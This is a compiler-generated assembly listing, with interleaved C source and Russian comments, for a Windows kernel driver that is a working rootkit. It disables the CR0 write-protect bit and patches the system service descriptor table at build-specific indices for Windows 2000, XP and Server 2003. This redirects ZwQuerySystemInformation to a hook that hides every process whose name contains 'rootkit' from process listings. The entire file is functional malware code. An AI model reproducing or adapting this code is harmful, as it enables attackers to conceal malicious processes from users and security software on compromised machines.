; Listing generated by Microsoft (R) Optimizing Compiler Version 13.10.3077 

	TITLE	.\rkdrv.cpp
	.386P
include listing.inc
if @Version gt 510
.model FLAT
else
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
_BSS	SEGMENT DWORD USE32 PUBLIC 'BSS'
_BSS	ENDS
$$SYMBOLS	SEGMENT BYTE USE32 'DEBSYM'
$$SYMBOLS	ENDS
_TLS	SEGMENT DWORD USE32 PUBLIC 'TLS'
_TLS	ENDS
;	COMDAT ??_C@_0BC@DNDIPBDM@?5ProcessId?5?$DN?5?$CFd?5?6?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_0BE@LAOEJFNA@Hide?5process?5?$CFws?5?$CB?6?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?SetKiSTHook@@YGXXZ
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DeleteKiSTHook@@YGXXZ
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
FLAT	GROUP _DATA, CONST, _BSS
	ASSUME	CS: FLAT, DS: FLAT, SS: FLAT
endif

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA	; OldZwQuerySystemInformation
_BSS	SEGMENT
?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA DD 01H DUP (?) ; OldZwQuerySystemInformation
_BSS	ENDS
PUBLIC	?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z	; MyZwQuerySystemInformation
PUBLIC	??_C@_0BC@DNDIPBDM@?5ProcessId?5?$DN?5?$CFd?5?6?$AA@ ; `string'
PUBLIC	??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@ ; `string'
PUBLIC	??_C@_0BE@LAOEJFNA@Hide?5process?5?$CFws?5?$CB?6?$AA@ ; `string'
EXTRN	_wcsstr:NEAR
EXTRN	_DbgPrint:NEAR
;	COMDAT ??_C@_0BC@DNDIPBDM@?5ProcessId?5?$DN?5?$CFd?5?6?$AA@
; File e:\delphi5\delphi7\projects\bhv\rkkm1a\rkdrv.cpp
CONST	SEGMENT
??_C@_0BC@DNDIPBDM@?5ProcessId?5?$DN?5?$CFd?5?6?$AA@ DB ' ProcessId = %d '
	DB	0aH, 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
CONST	SEGMENT
??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@ DB 'r', 00H
	DB	'o', 00H, 'o', 00H, 't', 00H, 'k', 00H, 'i', 00H, 't', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@LAOEJFNA@Hide?5process?5?$CFws?5?$CB?6?$AA@
CONST	SEGMENT
??_C@_0BE@LAOEJFNA@Hide?5process?5?$CFws?5?$CB?6?$AA@ DB 'Hide process %w'
	DB	's !', 0aH, 00H				; `string'
; Function compile flags: /Ogty
CONST	ENDS
;	COMDAT ?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z
_TEXT	SEGMENT
_SystemInformationClass$ = 8				; size = 4
_SystemInformation$ = 12				; size = 4
_SystemInformationLength$ = 16				; size = 4
_ReturnLength$ = 20					; size = 4
?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z PROC NEAR	; MyZwQuerySystemInformation, COMDAT

; 53   :   
; 54   :  NTSTATUS Res;
; 55   :  // Вызов исходной функции
; 56   :  Res = OldZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	mov	eax, DWORD PTR _ReturnLength$[esp-4]
	push	ebx
	mov	ebx, DWORD PTR _SystemInformationClass$[esp]
	push	esi
	mov	esi, DWORD PTR _SystemInformation$[esp+4]
	push	edi
	mov	edi, DWORD PTR _SystemInformationLength$[esp+8]
	push	eax
	push	edi
	push	esi
	push	ebx
	call	DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA ; OldZwQuerySystemInformation

; 57   :  // Анализ типа функции и результата
; 58   :  if ((SystemInformationClass != 5) || 
; 59   : 	 (Res != STATUS_SUCCESS) || 
; 60   : 	 (SystemInformationLength == 0)) 

	cmp	ebx, 5
	jne	SHORT $L9950
	test	eax, eax
	jne	SHORT $L9950
	test	edi, edi
	je	SHORT $L9950

; 61   :   return Res;
; 62   :  PSystemProcessesAndThreadsInformation 
; 63   : 	      SI_Item = (PSystemProcessesAndThreadsInformation)SystemInformation, 
; 64   : 	      SI_PrevItem = NULL;

	xor	ebx, ebx
	npad	4
$L9959:

; 65   :  // Объем непросканированной части буфера
; 66   :  LONG NoScanLength = SystemInformationLength;   
; 67   :  // Анализ результирующего массива
; 68   :  do {
; 69   : 	 NoScanLength -= SI_Item->NextEntryDelta;
; 70   : 	 DbgPrint(" ProcessId = %d \n", SI_Item->ProcessId);

	mov	ecx, DWORD PTR [esi+68]
	mov	eax, DWORD PTR [esi]
	push	ecx
	push	OFFSET FLAT:??_C@_0BC@DNDIPBDM@?5ProcessId?5?$DN?5?$CFd?5?6?$AA@
	sub	edi, eax
	call	_DbgPrint

; 71   : 	 // У объекта есть имя ? Если да, то ищем в нем строку "rootkit"
; 72   : 	 if (SI_Item->ProcessName.Buffer != NULL)

	mov	eax, DWORD PTR [esi+60]
	add	esp, 8
	test	eax, eax
	je	SHORT $L9969

; 73   : 	  if (wcsstr(SI_Item->ProcessName.Buffer, L"rootkit") != NULL) {

	push	OFFSET FLAT:??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
	push	eax
	call	_wcsstr
	add	esp, 8
	test	eax, eax
	je	SHORT $L9964

; 74   : 	   DbgPrint("Hide process %ws !\n", SI_Item->ProcessName.Buffer);

	mov	edx, DWORD PTR [esi+60]
	push	edx
	push	OFFSET FLAT:??_C@_0BE@LAOEJFNA@Hide?5process?5?$CFws?5?$CB?6?$AA@
	call	_DbgPrint

; 75   : 	   // Маскировка процесса
; 76   : 	   if (SI_Item->NextEntryDelta > 0) 

	mov	eax, DWORD PTR [esi]
	add	esp, 8
	test	eax, eax
	jbe	SHORT $L9967

; 77   : 	    SI_PrevItem->NextEntryDelta += SI_Item->NextEntryDelta; 	    	   

	add	DWORD PTR [ebx], eax

; 78   : 	   else

	jmp	SHORT $L9969
$L9967:

; 79   : 	    SI_PrevItem->NextEntryDelta = 0;	   

	mov	DWORD PTR [ebx], 0

; 80   :       } 
; 81   : 	  else

	jmp	SHORT $L9969
$L9964:

; 82   : 	   SI_PrevItem = SI_Item;

	mov	ebx, esi
$L9969:

; 83   : 	 // Переход на следующий элемент
; 84   : 	 if (SI_Item->NextEntryDelta > 0) 	  

	mov	eax, DWORD PTR [esi]
	test	eax, eax
	jbe	SHORT $L9961

; 85   : 	  SI_Item  = (PSystemProcessesAndThreadsInformation)((ULONG)SI_Item + SI_Item->NextEntryDelta);	 

	add	esi, eax

; 86   : 	 else
; 87   : 	  break;
; 88   :  } while (NoScanLength > 0);

	test	edi, edi
	jg	SHORT $L9959
$L9961:

; 89   :  return Res;

	xor	eax, eax
$L9950:
	pop	edi
	pop	esi
	pop	ebx

; 90   : }

	ret	16					; 00000010H
?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z ENDP		; MyZwQuerySystemInformation
_TEXT	ENDS
PUBLIC	?SetKiSTHook@@YGXXZ				; SetKiSTHook
EXTRN	_KeServiceDescriptorTable:DWORD
EXTRN	_NtBuildNumber:DWORD
EXTRN	__imp_@KfLowerIrql@4:NEAR
EXTRN	__imp__KeRaiseIrqlToDpcLevel@0:NEAR
; Function compile flags: /Ogty
;	COMDAT ?SetKiSTHook@@YGXXZ
_TEXT	SEGMENT
_OldCR0$ = -4						; size = 4
?SetKiSTHook@@YGXXZ PROC NEAR				; SetKiSTHook, COMDAT

; 93   : {

	push	ecx

; 94   :  DWORD OldCR0;	
; 95   :   
; 96   :  // Повышение приоритета
; 97   :  KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 

	call	DWORD PTR __imp__KeRaiseIrqlToDpcLevel@0
	mov	cl, al

; 98   :  
; 99   :  // Сброс WP бита
; 100  : _asm {
; 101  :     mov eax,CR0 

	mov	eax, cr0

; 102  :     mov OldCR0,eax

	mov	DWORD PTR _OldCR0$[esp+4], eax

; 103  :     and eax,0xFFFEFFFF			

	and	eax, -65537				; fffeffffH

; 104  :     mov cr0, eax

	mov	cr0, eax

; 105  :  }
; 106  : 	
; 107  :  switch (*NtBuildNumber) {

	mov	eax, DWORD PTR _NtBuildNumber
	movzx	eax, WORD PTR [eax]
	cmp	eax, 2195				; 00000893H
	je	SHORT $L9982
	cmp	eax, 2600				; 00000a28H
	je	SHORT $L9985
	cmp	eax, 3790				; 00000eceH
	jne	SHORT $L9979

; 116  :   case 3790:  // W2K3
; 117  :      OldZwQuerySystemInformation = (PZwQuerySystemInformation)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[181];

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	edx, DWORD PTR [edx+724]
	mov	DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA, edx ; OldZwQuerySystemInformation

; 118  : 	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[181]   = (NTPROC)*MyZwQuerySystemInformation;

	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [eax+724], OFFSET FLAT:?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z ; MyZwQuerySystemInformation

; 119  : 	 break;

	jmp	SHORT $L9979
$L9985:

; 111  : 	 break;
; 112  :   case 2600:   // Win XP
; 113  :      OldZwQuerySystemInformation = (PZwQuerySystemInformation)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[173];

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	edx, DWORD PTR [edx+692]
	mov	DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA, edx ; OldZwQuerySystemInformation

; 114  : 	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[173]   = (NTPROC)*MyZwQuerySystemInformation;

	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [eax+692], OFFSET FLAT:?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z ; MyZwQuerySystemInformation

; 115  : 	 break;

	jmp	SHORT $L9979
$L9982:

; 108  :   case  2195:  // Win 2k
; 109  :      OldZwQuerySystemInformation = (PZwQuerySystemInformation)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[151];

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	edx, DWORD PTR [edx+604]
	mov	DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA, edx ; OldZwQuerySystemInformation

; 110  : 	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[151]   = (NTPROC)*MyZwQuerySystemInformation;

	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [eax+604], OFFSET FLAT:?MyZwQuerySystemInformation@@YGJKPAXKPAK@Z ; MyZwQuerySystemInformation
$L9979:

; 120  : }
; 121  : 
; 122  :  // Восстановление WP бита
; 123  :  _asm {
; 124  : 	 mov eax,OldCR0		

	mov	eax, DWORD PTR _OldCR0$[esp+4]

; 125  :      mov cr0,eax

	mov	cr0, eax

; 129  : }

	add	esp, 4

; 126  :  }
; 127  :  // Восстановление приоритета
; 128  :  KeLowerIrql(OldIRQL);

	jmp	DWORD PTR __imp_@KfLowerIrql@4
?SetKiSTHook@@YGXXZ ENDP				; SetKiSTHook
_TEXT	ENDS
PUBLIC	?DeleteKiSTHook@@YGXXZ				; DeleteKiSTHook
; Function compile flags: /Ogty
;	COMDAT ?DeleteKiSTHook@@YGXXZ
_TEXT	SEGMENT
_OldCR0$ = -4						; size = 4
?DeleteKiSTHook@@YGXXZ PROC NEAR			; DeleteKiSTHook, COMDAT

; 133  : {

	push	ecx

; 134  :  DWORD OldCR0;	
; 135  :   
; 136  :  // Повышение приоритета
; 137  :  KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 

	call	DWORD PTR __imp__KeRaiseIrqlToDpcLevel@0
	mov	cl, al

; 138  :  
; 139  :  // Сброс WP бита
; 140  : _asm {
; 141  :     mov eax,CR0 

	mov	eax, cr0

; 142  :     mov OldCR0,eax

	mov	DWORD PTR _OldCR0$[esp+4], eax

; 143  :     and eax,0xFFFEFFFF			

	and	eax, -65537				; fffeffffH

; 144  :     mov cr0, eax

	mov	cr0, eax

; 145  :  }
; 146  : 	
; 147  :  switch (*NtBuildNumber) {

	mov	eax, DWORD PTR _NtBuildNumber
	movzx	eax, WORD PTR [eax]
	cmp	eax, 2195				; 00000893H
	je	SHORT $L9999
	cmp	eax, 2600				; 00000a28H
	je	SHORT $L10001
	cmp	eax, 3790				; 00000eceH
	jne	SHORT $L9996

; 154  :   case 3790:  // W2K3
; 155  :      KeServiceDescriptorTable->ntoskrnl.ServiceTable[181] = (NTPROC)*OldZwQuerySystemInformation;	 

	mov	edx, DWORD PTR _KeServiceDescriptorTable
	mov	eax, DWORD PTR [edx]
	mov	edx, DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA ; OldZwQuerySystemInformation
	mov	DWORD PTR [eax+724], edx

; 156  : 	 break;

	jmp	SHORT $L9996
$L10001:

; 150  : 	 break;
; 151  :   case 2600:   // Win XP
; 152  :      KeServiceDescriptorTable->ntoskrnl.ServiceTable[173] = (NTPROC)*OldZwQuerySystemInformation;	 

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	eax, DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA ; OldZwQuerySystemInformation
	mov	DWORD PTR [edx+692], eax

; 153  : 	 break;

	jmp	SHORT $L9996
$L9999:

; 148  :   case  2195:  // Win 2k
; 149  :      KeServiceDescriptorTable->ntoskrnl.ServiceTable[151] = (NTPROC)*OldZwQuerySystemInformation;	 

	mov	edx, DWORD PTR _KeServiceDescriptorTable
	mov	eax, DWORD PTR [edx]
	mov	edx, DWORD PTR ?OldZwQuerySystemInformation@@3P6GJKPAXKPAK@ZA ; OldZwQuerySystemInformation
	mov	DWORD PTR [eax+604], edx
$L9996:

; 157  : }
; 158  : 
; 159  :  // Восстановление WP бита
; 160  :  _asm {
; 161  : 	 mov eax,OldCR0		

	mov	eax, DWORD PTR _OldCR0$[esp+4]

; 162  :      mov cr0,eax

	mov	cr0, eax

; 166  : }

	add	esp, 4

; 163  :  }
; 164  :  // Восстановление приоритета
; 165  :  KeLowerIrql(OldIRQL);

	jmp	DWORD PTR __imp_@KfLowerIrql@4
?DeleteKiSTHook@@YGXXZ ENDP				; DeleteKiSTHook
_TEXT	ENDS
PUBLIC	?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z		; DriverUnload
; Function compile flags: /Ogty
;	COMDAT ?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z PROC NEAR	; DriverUnload, COMDAT

; 172  :  DeleteKiSTHook();

	call	?DeleteKiSTHook@@YGXXZ			; DeleteKiSTHook

; 173  :  return;
; 174  : }

	ret	4
?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z ENDP		; DriverUnload
_TEXT	ENDS
PUBLIC	?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ; DriverEntry
; Function compile flags: /Ogty
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
_pusRegistryPath$ = 12					; size = 4
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z PROC NEAR ; DriverEntry, COMDAT

; 179  : 	NTSTATUS          InitRes = STATUS_SUCCESS;	
; 180  : 	SetKiSTHook();

	call	?SetKiSTHook@@YGXXZ			; SetKiSTHook

; 181  :     // Подключение обработчика выгрузки драйвера
; 182  :     pDriverObject->DriverUnload  = DriverUnload;

	mov	eax, DWORD PTR _pDriverObject$[esp-4]
	mov	DWORD PTR [eax+52], OFFSET FLAT:?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z ; DriverUnload

; 183  : 	// Возврат результата инициализации
; 184  :     return InitRes;

	xor	eax, eax

; 185  : }

	ret	8
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ENDP ; DriverEntry
_TEXT	ENDS
END
